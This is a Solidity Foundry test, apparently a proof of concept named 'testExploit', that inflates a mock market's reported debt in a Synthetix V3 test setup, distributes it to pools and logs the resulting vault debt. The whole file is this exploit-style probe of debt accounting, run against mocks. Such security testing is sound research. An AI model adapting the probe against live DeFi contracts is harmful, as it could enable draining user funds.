//SPDX-License-Identifier: MIT
pragma solidity >=0.8.11 <0.9.0;

import {SynthetixV3Test} from "test/protocol/synthetix-v3/SynthetixV3Test.t.sol";

import {AccountModule} from "@synthetixio/main/contracts/modules/core/AccountModule.sol";
import {CollateralConfigurationModule} from "@synthetixio/main/contracts/modules/core/CollateralConfigurationModule.sol";
import {CollateralModule} from "@synthetixio/main/contracts/modules/core/CollateralModule.sol";
import {FeatureFlagModule} from "@synthetixio/main/contracts/modules/core/FeatureFlagModule.sol";
import {MarketManagerModule} from "@synthetixio/main/contracts/modules/core/MarketManagerModule.sol";
import {PoolModule} from "@synthetixio/main/contracts/modules/core/PoolModule.sol";
import {VaultModule} from "@synthetixio/main/contracts/modules/core/VaultModule.sol";
import {IssueUSDModule} from "@synthetixio/main/contracts/modules/core/IssueUSDModule.sol";
import {LiquidationModule} from "@synthetixio/main/contracts/modules/core/LiquidationModule.sol";

import {MarketConfiguration} from "@synthetixio/main/contracts/modules/core/PoolModule.sol";

import {AggregatorV3Mock} from "@synthetixio/main/contracts/mocks/AggregatorV3Mock.sol";
import {CollateralMock} from "@synthetixio/main/contracts/mocks/CollateralMock.sol";
import {MockMarket} from "@synthetixio/main/contracts/mocks/MockMarket.sol";

import "forge-std/console2.sol";

contract PendingExplot is SynthetixV3Test {
    function setUp() public {
        bootstrapWithMockMarketAndPool();
    }

    function testExploit() public {
        // Create pending debt
        uint128 marketId = system.markets[0];
        MockMarket market = system.marketInfo[marketId].market;
        market.setReportedDebt(1000 ether);

        MarketManagerModule(system.synthetix).distributeDebtToPools(marketId, 99999999);

        LiquidationModule(system.synthetix).isPositionLiquidatable(
            system.accountInfo[user1].accountId, system.pools[0], address(system.collateralInfo["SNX"].token)
        );

        LiquidationModule(system.synthetix).isPositionLiquidatable(
            system.accountInfo[user1].accountId, system.pools[0], address(system.collateralInfo["SNX"].token)
        );

        int256 debt =
            VaultModule(system.synthetix).getVaultDebt(system.pools[0], address(system.collateralInfo["SNX"].token));

        console2.log("totalDebt", debt);
    }
}
